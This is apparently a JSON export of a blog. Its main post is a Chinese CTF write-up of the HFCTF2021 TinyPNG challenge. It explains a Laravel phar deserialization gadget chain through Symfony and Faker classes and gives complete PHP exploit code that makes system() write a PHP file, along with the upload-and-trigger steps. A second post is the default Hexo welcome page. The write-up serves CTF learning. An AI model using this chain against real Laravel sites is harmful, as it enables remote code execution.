[{"title":"HFCTF2021 TinyPNG 复现","url":"https://blog.chriswitch.tk/20210429/HFCTF2021-TinyPNG/","content":"HFCTF2021 TinyPNG感谢 Naivekun 师傅的帮助\n因为题目没有给全环境，所以自己 docker 搭了个环境，和 Buu 上的好像不太一样，回头再研究\ndocker 环境我会放在我的 GitHub 上，复现环境\n修洞先看路由 routes/web.php\nRoute::get(&#x27;/&#x27;, function () &#123;    return view(&#x27;upload&#x27;);&#125;);Route::post(&#x27;/&#x27;, [IndexController::class, &#x27;fileUpload&#x27;])-&gt;name(&#x27;file.upload.post&#x27;);//Don&#x27;t expose the /image to others!Route::get(&#x27;/image&#x27;, [ImageController::class, &#x27;handle&#x27;])-&gt;name(&#x27;image.handle&#x27;);\n\n可以看到 //Don&#39;t expose the /image to others!\n所以修洞很简单，直接注释掉/image路由即可\n打洞题目给了Apache的配置文件，开启了目录重写\n所以访问/index.php/image即可访问到/image路由\n然后这一题可以上传文件，可以读取文件，打一个 phar 反序列化\n参考文章：一道CTF题引起的对laravel v8.32.1序列化利用链挖掘\n题目环境里给出了 Laravel 的版本\n&quot;require&quot;: &#123;        &quot;php&quot;: &quot;^7.3|^8.0&quot;,        &quot;fideloper/proxy&quot;: &quot;^4.4&quot;,        &quot;fruitcake/laravel-cors&quot;: &quot;^2.0&quot;,        &quot;guzzlehttp/guzzle&quot;: &quot;^7.0.1&quot;,        &quot;laravel/framework&quot;: &quot;^8.12&quot;,        &quot;laravel/tinker&quot;: &quot;^2.5&quot;    &#125;,\n\n所以照文章找一条链下来是个不错的选择\nImportConfigurator 类第一个是 Symfony\\Component\\Routing\\Loader\\Configurator 中的类 ImportConfigurator\n该类存在一个包含了语句 $this-&gt;xxx-&gt;xxx() 的 __destruct 方法\n这样我们可以控制 $this-&gt;xxx，从而执行一些预期之外的方法\n# vendor/symfony/routing/Loader/Configurator/ImportConfigurator.phpclass ImportConfigurator&#123;    private $parent;    //...    public function __destruct()        &#123;            $this-&gt;parent-&gt;addCollection($this-&gt;route);        &#125;    //...&#125;\n\n因为函数名不可控，找一个有 __call 方法的类\n比如说 Faker 中的类 ValidGenerator\nValidGenerator 类# vendor/fakephp/faker/src/Faker/ValidGenerator.phpclass ValidGenerator&#123;    protected $generator;    protected $validator;    protected $maxRetries;    //...    public function __call($name, $arguments)        &#123;            $i = 0;            do &#123;                $res = call_user_func_array([$this-&gt;generator, $name], $arguments);                $i++;                if ($i &gt; $this-&gt;maxRetries) &#123;                    throw new \\OverflowException(sprintf(&#x27;Maximum retries of %d reached without finding a valid value&#x27;, $this-&gt;maxRetries));                &#125;            &#125; while (!call_user_func($this-&gt;validator, $res));            return $res;        &#125;    //...&#125;\n\n选用这个类是因为这个 __call 方法中包含了清晰可见的 call_user_func_array 和 call_user_func\n可以发现 call_user_func 的参数 $this-&gt;validator 是可控的\n而另一个参数 $res 是从 call_user_func_array 函数中获得的返回值\ncall_user_func_array 的参数中，$this-&gt;generator 是可控的\n但我们无法控制他的返回值，即无法控制 $res\n另一个参数 $name 是不可控的，且值为 addCollection\nDefaultGenerator 类我们再看到 Faker 中的类 DefaultGenerator\n# vendor/fakephp/faker/src/Faker/DefaultGenerator.phpclass DefaultGenerator&#123;    protected $default;\t//...\tpublic function __call($method, $attributes)    \t&#123;        \treturn $this-&gt;default;    \t&#125;    //...&#125;\n\n这里的 __call 方法会返回一个我们完全可控的 $this-&gt;default\n于是到这里，ValidGenerator 中的 $res 参数就是我们可以控制的了\n调用链梳理一下调用链\n&lt;?phpclass ImportConfigurator&#123;    public function __destruct()    &#123;        $this-&gt;parent-&gt;addCollection($this-&gt;route);    &#125;&#125;class ValidGenerator&#123;    public function __call($name, $arguments)    &#123;        $i = 0;        do &#123;            $res = call_user_func_array([$this-&gt;generator, $name], $arguments);            $i++;            if ($i &gt; $this-&gt;maxRetries) &#123;                throw new \\OverflowException(sprintf(&#x27;Maximum retries of %d reached without finding a valid value&#x27;, $this-&gt;maxRetries));            &#125;        &#125; while (!call_user_func($this-&gt;validator, $res));        return $res;    &#125;&#125;class DefaultGenerator&#123;    public function __call($method, $attributes)        &#123;            return $this-&gt;default;        &#125;&#125;\n\n1、通过 ImportConfigurator 类的 __destruct 方法触发 ValidGenerator 类的 __call 方法\n2、ValidGenerator 类的 __call 方法中的 call_user_func_array 函数\n​        触发 DefaultGenerator 类的 __call 方法\n3、DefaultGenerator 类的 __call 方法返回值完全可控，\n​        即ValidGenerator 类的 __call 方法中的 call_user_func_array 函数返回值 $res 可控\n4、ValidGenerator 类的 __call 方法中 call_user_func 函数的两个参数都可控\n条件梳理\n\nImportConfigurator-&gt;parent = ValidGenerator 类\nValidGenerator-&gt;maxRetries = 1\nValidGenerator-&gt;generator = DefaultGenerator 类\nDefaultGenerator-&gt;default = [任意可控函数参数]\nValidGenerator-&gt;validator = [任意可控函数名称]\n\nEXP&lt;?phpnamespace Symfony\\Component\\Routing\\Loader\\Configurator&#123;    class ImportConfigurator&#123;        private $parent;        function __construct($c1)&#123;            $this-&gt;parent = $c1;        &#125;    &#125;&#125;namespace Faker&#123;    class DefaultGenerator&#123;        protected $default;        function __construct($param)&#123;            $this-&gt;default = $param;        &#125;    &#125;    class ValidGenerator&#123;        protected $generator;        protected $validator;        protected $maxRetries;        function __construct($func,$param)&#123;            $this-&gt;generator = new DefaultGenerator($param);            $this-&gt;maxRetries = 1;            $this-&gt;validator = $func;        &#125;    &#125;&#125;namespace&#123;    $phar = new Phar(&#x27;exp1.phar&#x27;);        $phar = $phar-&gt;convertToExecutable(Phar::TAR, Phar::GZ);        $phar-&gt;startBuffering();    $phar-&gt;setStub(&#x27;&lt;?php __HALT_COMPILER();?&gt;&#x27;);    $phar-&gt;addFromString(&#x27;test.txt&#x27;, &#x27;test&#x27;);    $o = new Symfony\\Component\\Routing\\Loader\\Configurator\\ImportConfigurator(        new Faker\\ValidGenerator(&#x27;system&#x27;,&#x27;echo &quot;&lt;?php phpinfo(); ?&gt;&quot; &gt; 1.php&#x27;)    );    $phar-&gt;setMetadata($o);    $phar-&gt;stopBuffering();    echo serialize($o);&#125;\n\n因为上传文件有对 stub 和 php 的过滤，加一行语句压缩一下就能过\n生成出来的 exp1.phar.tar.gz，改名为 exp1.png\n上传文件，然后访问路由 /index.php/image?image=phar://./uploads/xxxxxxx.png 即可\n会返回 500 错误，但是 phar 反序列化已经执行了，所以会在 public 目录生成一个 1.php\n访问 1.php 即可\n\n\n\n\n","categories":[],"tags":["CTF WriteUp"]},{"title":"Hello World","url":"https://blog.chriswitch.tk/20201007/hello-world/","content":"Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub.\nQuick StartCreate a new post$ hexo new &quot;My New Post&quot;\n\nMore info: Writing\nRun server$ hexo server\n\nMore info: Server\nGenerate static files$ hexo generate\n\nMore info: Generating\nDeploy to remote sites$ hexo deploy\n\nMore info: Deployment\n","categories":[],"tags":[]}]